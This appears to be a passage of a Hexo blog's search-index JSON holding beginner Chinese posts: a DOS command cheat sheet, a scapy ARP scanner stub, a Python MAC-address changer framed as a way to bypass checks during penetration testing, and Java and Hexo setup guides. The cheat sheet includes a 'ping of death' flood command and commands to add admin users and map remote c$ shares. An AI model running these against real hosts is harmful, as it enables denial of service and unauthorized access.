#尝试能否链接此IP&#x2F;域名\n\nping baidu.com     #尝试是否能访问百度，最常用来查看网络是否接通\n\nping -t -I 65500:IP   #死亡之ping，发送大量数据包\n\nipconfig命令常用ipconfig     #帮助用户查看网络状况，如延迟、IP、主机信息、物理地址信息等\n\nipconfig&#x2F;all  #显示本机TCP&#x2F;IP配置的详细信息\n\nipconfig &#x2F;release #DHCP客户端手工释放IP地址\n\nipconfig &#x2F;renew   #DHCP客户端手工向服务器刷新请求\n\n\n不常用ipconfig &#x2F;flushdns  #清除本地DNS缓存内容\n\nipconfig &#x2F;displaydns  #显示本地DNS内容\n\nipconfig &#x2F;registerdns   #DNS客户端手工向服务器进行注册\n\nipconfig &#x2F;showclassid   #显示网络适配器的DHCP类别信息\n\nipconfig &#x2F;setclassid   #设置网络适配器的DHCP类别\n\nipconfig &#x2F;renew “Local Area Connection”  #更新“本地连接”适配器的由 DHCP 分配 IP 地址的配置\n\nipconfig &#x2F;showclassid Local*  #显示名称以 Local 开头的所有适配器的 DHCP 类别 ID\n\nipconfig &#x2F;setclassid “Local Area Connection” TEST #将“本地连接”适配器的 DHCP 类别 ID 设置为 TEST\n\n关于文件/目录的命令目录查看及跳转dir    #查看目录\npwd   #查看当前路径\ncd 目录  #切换到指定目录\nd:    #进入d盘，这个不用cd\ncd ..  #返回上级目录\ncd &#x2F; #跳转到根目录\nhelp cd  #查看cd命令详细信息\ntree    #列出路径中文件树形结构\n\n文件/目录创建及删除copy con d:123.txt   #创建123.txt文件\n立马进入输入模式：hello world\n输入完成按CTRL+z  再按回车退出输入模式\nmd 目录名    #创建目录\nrd 目录名    #删除文件夹\ndel 文件名   #删除文件\n\n文件的查看start 文件名   #按照默认打开方式打开查看，也能打开网页等，如:start www.baidu.com\ntrpe 文件名     #在命令行查看\n\n文件的移动copy 文件 移动目录    #复制文件到移动目录中\nmove 文件 移动目录   #将文件移动到相应目录中\n\n文件重命名ren 原文件名 新文件名        #重命名文件\n\n系统命令systeminfo   #查看系统信息\n\narp命令arp -a   #用于查看高速缓存中的所有项目\narp -a IP  #只显示与该接口相关的ARP缓存项目\narp -s IP 物理地址 #人工配置的物理地址将自动更新该项目\narp -d IP   #使用本命令能够人工删除一个静态项目\n\nshutdown命令shutdown -s -t 180 -c “关机”    #定时关机，并提示\nshutdown -a   #取消计划关机\n\nnet命令net view    #查看局域网内吉他计算机的名称\nnet start    #查看开启了哪些服务\nnet start 服务名   #开启服务(如：net start telent)\nnet stop 服务名   #停止服务\nnet use k:\\\\IP\\c$  #映射目标IP到本地k盘\nnet use k:\\\\IP\\c$&#x2F;del   #断开映射\nnet user 用户名 密码 &#x2F;add   #建立用户\nnet suer 用户名 &#x2F;del   #删除用户\nnet user guest&#x2F;active:yes    #激活guest用户\nnet user #查看有哪些用户\nnet user 账户名  #查看账户属性\nnet localgroup administrators 用户名 &#x2F;add   #把“用户”添加到管理员中\nnet user guest 12345 #用guest登陆后将密码改为12345\nnet password 密码  #更改系统登录密码\nnet share  #查看本地开启的共享\nnet share ipc$   #开启ipc$共享\nnet share ipc$ &#x2F;del   #删除ipc$共享\nnetstat -a   #查看端口\nnetstat -n   #查看端口的网络连接情况\nnetstat -v    #查看正在进行的工作\n\nat命令at id号   #开启已注册的某个计划任务\nat &#x2F;delete #停止所有计划任务用参数&#x2F;yes则不需确定就直接停止\nat id号 &#x2F;delete  #停止某个已注册的计划任务\nat #查看所有计划任务\nattrib 文件名(目录名) #查看某文件或目录的属性\nattrib 文件名 -A -R -S -H 或 +A +R +S +H   #去掉(添加)某文件的存档，只读，系统，隐藏属性\n\n批处理文件就是将一些DOS命令写好，并将其放到后缀为.bat的文件里。\n计划命令太多了，不写了查看这个连接就行：https://blog.csdn.net/weixin_34128237/article/details/93049391\n\n","slug":"DOS命令","date":"2021-09-26T10:03:04.000Z","categories_index":"windows基础","tags_index":"DOS命令","author_index":"Longw"},{"id":"8144d90f97aac2df03b3e52cffae8156","title":"开发网络扫描器","content":"\n\n用Python开发网络扫描器网络扫描器简介我们直接看百度的结果：\n​         迅速发展的Internet给人们的生活、工作带来了巨大的方便，但同时，也带来了一些不容忽视的问题，网络信息的安全保密问题就是其中之一。　　网络的开放性以及的是造成网络不安的主要原因。科学家在设计Internet之初就缺乏对安全性的总体构想和设计，我们所用的TCP/IP 协议是建立在可信的环境之下，首先考虑的是网络互连，它是缺乏对安全方面的考虑的。而且TCP/IP协议是完全公开的，远程访问使许多者无须到现场就能够得手，连接的主机基于互相信任的原则等等这一些性质使网络更加不安全。　　先进的技术是实现网络信息安全的有力武器，这些技术包括:密码技术、身份验证技术、访问控制技术、安全内核技术、网络反病毒技术、信息泄漏防治技术、防火墙技术、网络安全漏洞扫描技术、检测技术等。而在系统发生安全事故之前对其进行预防性检查，及时发现问题并予以解决不失为一种很好的办法，于是网络安全漏洞扫描技术应运而生。\n用Python编写网络扫描器程序话不多说，直接干，首先了解一下scapy这个库的ARP模块：\n#!&#x2F;usr&#x2F;bin&#x2F;env python\n# -*- coding: utf-8 -*-\n# @Time :2021-09-15 14:15\n# @Author : longw\n# @File : network_scanner_argparse.py\n# @Software : PyCharm\n\n\nimport scapy.all as scapy\n\ndef scan(ip): # 广播ip地址\n\tscapy.arping(ip) \n\nscan(&quot;192.168.253.2&quot;)  #路由地址\n\n\n想要知道路由地址，直接在Linux主机终端输入：\nroute -n\n\n来看下程序执行结果：\n图片1……………正在输入中。。。。。。。","slug":"开发网络扫描器","date":"2021-09-20T10:54:58.000Z","categories_index":"开发网络扫描器","tags_index":"payload","author_index":"Longw"},{"id":"f125174ab074d2773620490648712dee","title":"修改MAC地址","content":"\n\n通过Python修改Linux主机的MAC地址为什么要修改MAC地址进行渗透测试时，可以修改mac地址来绕过某些验证。。。。。。。\n\n我们先来看一下MAC地址，我们输入：\nifconfig\n\n\n这个ether后面的就是我们的MAC地址，MAC地址的长度为48位(6个字节)，通常表示为12个16进制数。\n通过ifconfig指令修改MAC地址先来看下如何通过ifconfig指令来修改MAC地址，输入：\nifconfig eth0 down    #用来关闭网络连接\nifconfig eth0 hw ether 00:11:22:33:44:44    #修改MAC地址为00:11:22:33:44:44\nifconfig eth0 up   #用来开启网络连接\n\n我这里连的是无线网，所以是修改eth0，而有些人会有一个无线接口wlan0只需将eth0修改为wlan0就行了。通过以上指令我们再次输入ifconfig就会发现MAC地址已经修改完成了：\n\n这里可能会提醒你，你的权限不够只需以root权限运行指令就行了。\n通过Python来完成修改MAC地址我们先建立一个Python文件，命名为mac_change.py。建好之后现在前面加上这两行代码：\n#!usr&#x2F;bin&#x2F;env python\n# -*- coding: utf-8 -*-\n\n第一句是告诉系统应当如何执行这个文件，第二句是添加默认编码格式。然后我们导入第一个库：\nimport subprocess\n\n这个库是用来开启一个子进程执行我们的命令。因为我们要对MAC地址进行修改，所以这个库是必要的。\n非常简单只需利用它其中一个模块：\nsubprocess.call(([&quot;ifconfig&quot;, &quot;eth0&quot;, &quot;down&quot;]))\nsubprocess.call(([&quot;ifconfig&quot;, &quot;eth0&quot;, &quot;hw&quot;, &quot;ether&quot;, &quot;00:11:22:33:44:55&quot;]))\nsubprocess.call(([&quot;ifconfig&quot;, &quot;eth0&quot;, &quot;up&quot;]))\n\n然后我们直接运行程序。成功后，再次输入ifconfig：\n\n可以看到，我们成功的利用Python程序修改了MAC地址。这是直接运行，我们也可以在终端运行：\ncd PycharmProjects&#x2F;mac_change&#x2F;     #先到达程序目录\n\npython3 mac_change.py          #运行程序\n\nifconfig                    #查看\n\n\n可以看到，成功通过终端运行程序修改MAC地址程序。\n让用户输入修改信息修改MAC地址这是我们的主要程序已经实现，但是我们想自己修改eth0和wlan0就得去修改程序。这样非常麻烦。所以我们可通过输入信息，来达到修改的目的，定义两个变量接收我们的输入：\ninterface &#x3D; input(&quot;请输入要修改的接口 &gt; &quot;)\nnew_mac &#x3D; input(&quot;请输入新的MAC地址 &gt; &quot;)\n\nsubprocess.call(([&quot;ifconfig&quot;, interface, &quot;down&quot;]))\nsubprocess.call(([&quot;ifconfig&quot;, interface, &quot;hw&quot;, &quot;ether&quot;, new_mac]))\nsubprocess.call(([&quot;ifconfig&quot;, interface, &quot;up&quot;]))\n\n再次运行：\n\n成功完成通过输入修改MAC地址。当然这样的程序并不是太好看，我们可以通过定义函数来达到功能实现的效果：\ninterface &#x3D; input(&quot;请输入要修改的接口 &gt; &quot;)\nnew_mac &#x3D; input(&quot;请输入新的MAC地址 &gt; &quot;)\n\ndef change_mac(interface,new_mac):\n    print(&quot;[+] Change MAC address for &quot; + interface + &quot; to &quot; + new_mac)\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;down&quot;]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;hw&quot;, &quot;ether&quot;, new_mac]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;up&quot;]))\n\nchange_mac(interface,new_mac)\n\n还给与了用户提示信息，再次通过终端运行它：\n\n再次成功完成。这样看起来就有点脚本的感觉了。当然我们还可以对它进行更近一步的优化，这里就不讲了，写好的代码放在下面：\n#!usr&#x2F;bin&#x2F;env python\n# -*- coding: utf-8 -*-\n\nimport subprocess\nimport optparse\nimport re\n\n\ndef change_mac(interface, new_mac):\n    print(&quot;[+] Change MAC address for &quot; + interface + &quot; to &quot; + new_mac)\n    # 这是防止用户随意输入的方法\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;down&quot;]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;hw&quot;, &quot;ether&quot;, new_mac]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;up&quot;]))\n\n\ndef get_arguments():\n    # 给予用户帮助信息\n    parser &#x3D; optparse.OptionParser()\n    parser.add_option(&quot;-i&quot;, &quot;--interface&quot;, dest&#x3D;&quot;interface&quot;, help&#x3D;&quot;Interface to change its MAC address &quot;)\n    parser.add_option(&quot;-m&quot;, &quot;--mac&quot;, dest&#x3D;&quot;new_mac&quot;, help&#x3D;&quot;New MAC address &quot;)\n    (options, arguments) &#x3D; parser.parse_args()\n    if not options.interface:\n        parser.error(&quot;[-] 请指定一个interface,或者使用--help查看帮助 &quot;)\n    elif not options.new_mac:\n        parser.error(&quot;[-] 请指定一个new_mac,或者使用--help查看帮助 &quot;)\n    return options\n\n\ndef get_current_mac(interface):\n    ifconfig_result &#x3D; subprocess.check_output([&quot;ifconfig&quot;, interface])\n    mac_address_search_result &#x3D; re.search(r&quot;\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w&quot;, str(ifconfig_result))\n    # str(ifconfig_result) 这是python3\n    if mac_address_search_result:\n        return mac_address_search_result.group(0)\n    else:\n        print(&quot;[-] 无法读取MAC地址&quot;)\n\n\noptions &#x3D; get_arguments()\ncurrent_mac &#x3D; get_current_mac(options.interface)\nprint(&quot;Current MAC &#x3D; &quot;+str(current_mac))\n\nchange_mac(options.interface, options.new_mac)\n\ncurrent_mac &#x3D; get_current_mac(options.interface)\nif current_mac &#x3D;&#x3D; options.new_mac:\n    print(&quot;[+] MAC地址修改成功:&quot;+current_mac)\nelse:\n    print(&quot;MAC地址修改失败&quot;)\n\n\n","slug":"修改MAC地址","date":"2021-09-10T14:29:28.000Z","categories_index":"修改MAC地址","tags_index":"payload","author_index":"Longw"},{"id":"3c31ab40e966953ecfabe666f24c6141","title":"java安装","content":"\n\n安装Java集成环境JDK与JRE  JRE是Java的运行环境，是运行Java程序所必要的。而JDK是Java的开发环境，它里面就包含了JRE，所以我们学习Java就必须安装JDK。（这里的版本是Windows的）\nJDK安装首先，我们访问这个网址：https://www.oracle.com/cn/java/technologies/javase-downloads.html\n进去后，我们将看到如下界面：\n\n接着，我们往下翻看到Java SE 8下面有个Oracle JDK在下面有个JDK Download。我们点击它进入下面这个界面：\n\n这里讲一下，目前为止Java 8这个版本都是最流行，最稳定也是最适合我们学习的。我们往下翻看到：\n\n然后我们点击下载链接，接着会弹出同意链接，我们点击同意后继续下载。接着会弹出登录页面，有Oracle账户直接登录，没有我们就选择注册就行了。都是中文，把该填的都填上就行了。然后我们就可以下载了。等到下载好了之后，我们双击它进行安装。安装时，最开始的默认位置我们不要改：\n\n直接下一步，接着会安装JRE，同样安装到默认文件夹里，点击下一步：\n\n安装好之后，我们需要查看一下是否安装成功。win+r打开cmd，在里面输入：\njava -version\n\n出现以下页面代表安装成功了：\n\n测试Java程序现在我们还没有安装Java的程序编写工具，我们先用记事本书写第一个Java程序：\npublic class HelloWorld&#123;\n        public static void main(String[] args)&#123;\n                System.out.println(&quot;HelloWorld!&quot;);\n        &#125;\n&#125;\n\n在记事本里输入一下代码，然后我们保存为HelloIWorld.java格式的文件。接着在盘符里新建一个Javatest文件夹并将我们写好的Java文件放到这个Javatest文件夹里面。我们直接在文件夹目录地址上输入cmd，回车：\n\n进入后我们输入这行代码，将我们写好的Java文件进行编译：\njavac HelloWorld.java\n\n回车发现，显示javac不是内部命令提示。这是就需要配置环境变量了。打开我们安装Java的文件夹，打开如下路径：C:\\Program Files\\Java\\jdk1.8.0_301\\bin  我们复制这个路径。右键此电脑选择属性，在搜索框搜索环境变量，我们选择编辑账户的环境变量，我们选择中间的新建，添加变量名为JAVA_HOME,地址为：C:\\Program Files\\Java\\jdk1.8.0_301     确定。接着我们点击path，选择编辑，选择新建，输入：**%JAVA_HOME%\\bin**。接着我们保存就好。\n配置好环境变量后，我们在重新从文件夹里打开cmd，再次输入：\njavac HelloWorld.java\n\n这时我们发现没有问题。打开文件夹发现多了一个HelloWorld.class的文件，这就是Java文件的编译文件。在cmd中我们再输入：\njava HelloWorld\n\n发现成功输出：\n\n需要记住的一点是，每当我们修改.java文件里的程序内容，我们都需要对它再次进行编译，不然我们执行的永远是以前编译好的程序内容。\nEclipse的下载和安装Eclipse的下载和安装我们打开这个链接：https://www.eclipse.org/downloads/ 。打开之后，我们往下滑找到那个长方形的大的黄色按钮，我们选择下面的那个：Download Packages。接着在新页面我们选择：\n\n点击进入下载页面，然后我们点击Download进行下载。接着就是耐性等待下载完成。\n下载完成后我们将它解压到我们有空余空间的盘符里。如放到D盘的根目录，接下来我们双击运行程序\n发现需要我们选择工作区，就是Java文件的保存位置。我们可以在D盘新建一个workspace文件夹，然后将路径改到那个文件夹的位置。选择launch运行，看到欢迎页面。到此位置以及安装成功了。\n现在我们为方便以后写代码，修改一下字号：**Windows—–&gt;preferences——-&gt;General——-&gt;Appearance——–&gt;Colos and Fonts—–&gt;Basic————-&gt;Text Font————-&gt;Edit…**。选择自己想要的字体和字号就行。\n但是要注意不要选择带有@符号的，会导致中文字体倾斜。\n\n","slug":"java安装","date":"2021-09-05T10:37:40.000Z","categories_index":"Java安装","tags_index":"Java","author_index":"Longw"},{"id":"10e502baa80f2697db123aad5a708fe1","title":"关于如何建立blog","content":"\n\n关于如何建立向我这样子的博客1.首先需要搭建环境npm和node.js的安装我们直接安装nvm,用它来安装及管理node.js和npm。\n下载地址：https://github.com/coreybutler/nvm-windows/releases\n对应的系统下载对应的最新版本就行了，我是用的windows直接下载nvm-setup.zip，下载完成后直接双击运行。默认安装就行，期间修改安装路径放到你想安装的盘里。C盘够大的话放在C盘也没什么问题，我C盘内存不太大就放在D盘里面了。\n\n由于我已经安装完成就不放截图了，傻瓜式安装大家都会。\n安装完成后，win+r打开cmd输入nvm即可查看当前版本的相关信息，如图所示：\n\n接下来，我们需要安装node.js，node.js自带npm。运行命令：\nnvm install 12.14.0\n\n这里需要注意的是，安装的版本不要太高，不然等你修改主题的时候发现不匹配就糟糕了。我这里安装12.14.0版本，适配了我这个主题。\n\n安装完成后来看几条nvm的命令：\n查看node.js版本的，能看到你安装了几个node\nnvm list    \n\n使用node.js的版本\nnvm use 12.14.0\n\n卸载node.js版本\nnvm uninstall 12.14.0\n\n安装完成就可以输入使用命令了，注意如果你这里使用不了，那就是你没有将node.js添加到环境变量里。因为一般是默认就配置好了，我这边就不讲了，有问题看这边：https://www.cnblogs.com/mmit/p/12623348.html\nhexo安装接下来就是我们的神器hexo的安装了，它将自动帮助我们生成一个默认的博客框架。安装的时候就要用到我们刚才安装node.js的时候自带的npm了，打开cmd输入：\nnpm install -g cnpm --registry&#x3D;http:&#x2F;&#x2F;registry.npm.taobao.org\n\n回车安装，这里使用了淘宝的源安装cnpm，这样安装速度快一点。这里我们耐心等待安装完成就行了。安装好之后输入命令：\ncnpm install -g hexo-cli\n\n用来安装hexo，等待安装完成后就可以输入：\nhexo -v\n\n查看hexo的版本信息，出现如下界面时就表示安装成功了：\n\nGit安装现在就来安装Git，这是我们用将博客布置到github上的工具。至于其他的功能有兴趣后面可以自己摸索。安装的方法可用这个连接查看：https://blog.csdn.net/qq_39377418/article/details/95199800?ops_request_misc=%7B%22request%5Fid%22%3A%22159022752019724839242812%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=159022752019724839242812&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_v3-1-95199800.first_rank_ecpm_v1_pc_rank_v3&amp;utm_term=git%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B+windows\n下载新版本安装时，安装配置文件选项跟链接里有些不一样，实在不知道怎么办可以下载与链接里相同的版本就行了。\n2.生成hexo默认版本博客在前面安装好Git之后我们还需要对它进行配置。首先我们需要github的账号，因为我们需要在github上寄存我们的博客，以便我们在公网上对它进行访问。在注册好github账号后。我们双击Git运行它，输入这两条命令：  \nname是你的github账号     &#x65;&#x61;&#x6d;&#x69;&#108;&#64;&#x71;&#x71;&#x2e;&#x63;&#111;&#109;是你的邮箱\ngit config --global user.name &quot;name&quot;\ngit config --global user.email &quot;eamil@qq.com” \n\n接下来就轻松了，我们在自己的盘符中建立一个文件夹blog用来存放我们hexo博客的默认文件。win+r进入cmd，我们将路径转到建好的文件夹blog中，输入命令：\nhexo init\n\n来初始化配置默认博客文件。如果不成功，可能是Git的环境变量没有配置好，去配置好继续输入命令就行。当出现 INFO Start blogging with Hexo！就代表你已经配置成功了。\n继续输入cmd命令：\nhexo s\n\n在本地运行博客，我们将会在localhost：4000中预览我们的博客：\n\n页面不一样很正常，我这里对主题进行了配置。反正你肯定能看到helloworld这篇文章，这是默认生成的。\n到这里，你的博客已经生成好了。接下来，就是将博客部署到github项目库里，让我们能通过链接访问。\n3.将博客部署到github上首先，我们需要用到一个插件。在cmd中输入命令：\ncnpm install hexo-deployer-git --save\n\n进行安装，安装完成后。我们要在空荡荡的github主页上建立我们的第一个项目库。他的名字叫做：\ngithubname.github.io这里的githubname是你的github的账户名。使用chrome登录到github中，在右边头像里选择Your repositories—-&gt;选择new—–&gt;在Repository name 中填写上我们的项目名字—–&gt;直接到下面带点Create repository 即可创建完成。\n其次，我们到blog文件夹中修改**_config.yml** 文件，用记事本打开即可，ctrl+f打开搜索，查找deploy：。然后我们对它进行配置。如图：\n\n你只需修改repo为你自己的GitHub项目库地址就行。可以在Your repositories—-&gt;选择建好的项目库名字进入详情页——–&gt;点击code就会出现链接地址，我们只需将它复制粘贴即可。\n最后，就是将项目部署到github库中.win+r输入cmd，转到blog路径。不会的例子如下图：\n\n进入路径后我们只需要输入命令：\nhexo d\n\n接下来输入账号密码即可，要输入两次。注意：\n你将会看到下面这句错误提示：remote: Support for password authentication was removed on August 13, 2021. 这是因为github将密码换成了token。你必须生成自己的token替换成密码才能将项目部署到github上。生成token教程如下：\n选择头像里的setting——-&gt;选择Developer setting——&gt;选择personal access token—–&gt;选择create new token。之后我们需要设置token的有效期和权限范围，这是可以用chrome自带的翻译查看选项意思，当然rope选项是一定要选择的。然后选择Generate token将会生成token，这个时候一定要将token复制保存起来，以防止后面我们刷新后找不到了。现在我们再次使用命令 hexo d 在上传时填写密码的第二次操作时将我们的token放到密码输入行里，出现Branch ‘master’ set up to track remote branch ‘master’from’https://github.com/liao545/liao545.github.io.git&#39;.的提示时，代表上传成功了。为了防止麻烦我们可以输入命令：\ngit remote set-url origin https:&#x2F;&#x2F;&lt;your_token&gt;@github.com&#x2F;&lt;USERNAME&gt;&#x2F;&lt;REPO&gt;.git\n\n其中，your_token为你自己生成的token，USERNAME为你github的账户名，REPO 为你的项目库的名字。这样就可以将仓库和token进行绑定，以避免我们重复输入token的操作。部署完成后我们就可以通过项目地址链接对我们的博客进行访问：https://GithubUsername.github.io。\n\n4.绑定域名通过上面的链接，我们可以正常访问我们的博客了。接下来就是如何通过我们自己的专属域名来访问我们的博客了。\n购买域名首先，我们要先去购买一个域名，我以华为云为例。我们注册华为云账号，进行实名认证，不认证你是无法购买域名的。全中文页面，如何购买我就不讲了。购买完成后，要进行信息模板的建立，在域名注册菜单下选择信息模板，添加默认信息模板即可。当审核完成后，我们的域名才会过户到我们的默认模板下。\n域名解析其次，我们进行域名解析，公网解析，选择管理解析，再选择快速添加解析。在出现页面中输入我们博客地址的IP地址即可。IP地址获取我们可以通过win+r输入cmd，再输入ping liao545.github.io 即可获取，完成后将出现两个新的解析条例，他们的属性都是A，我们对其头文件为www的属性修改为CNAME，并将下面地址改为自己购买的域名，如我的就是liaowblog.com。如此我们就完成了域名的解析，一般第二天就会完全生效。\n将域名与github项目绑定最后，就是将我们的域名和github项目进行绑定，以便我们通过域名访问博客。先在我们的blog文件夹中新建一个文本文档，在里面输入www.你的域名，保存后，出来将文档重命名为CNAME，注意没有后缀。然后我们在github项目详情页面点Add file —&gt;create new file—&gt;名字跟上面一样为CNAME，内容也是www.你的域名—–&gt;然后我们创建即可。当修改生效后，我们就可以通过www.你的域名来访问你的博客了。\n5.结尾大致的步骤都在上面了，不会的出错的就按照步骤名和错误提示在网上搜索一下。那我们后续如何书写博客呢？下载一个Typora或者其他的编辑器。用来对md文档进行编辑，然后我们在blog下输入cmd命令：\nhexo new post &lt;title&gt;\n\n然后，title为你的文件名，这样就会在blog—&gt;source—&gt;_post里面生成一个title.md的文件，通过下载好的编辑器对他进行修改即可，打开后里面会有一段代码，包括你的文章名和日期。写好之后，就可以通过以下几条命令上传到我们的博客中了：\nhexo clean\n\nhexo g\n\nhexo d\n\n分别是，清除缓存，生成静态文件，以及上传到github文件。再次访问我们的www.你的域名即可查看新写的博客了。\n\n","slug":"关于如何建立blog","date":"2021-08-21T13:09:42.000Z","categories_index":"博客建立","tags_index":"博客","author_index":"Longw"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2021-08-18T06:43:13.628Z","categories_index":"","tags_index":"","author_index":"Longw"}]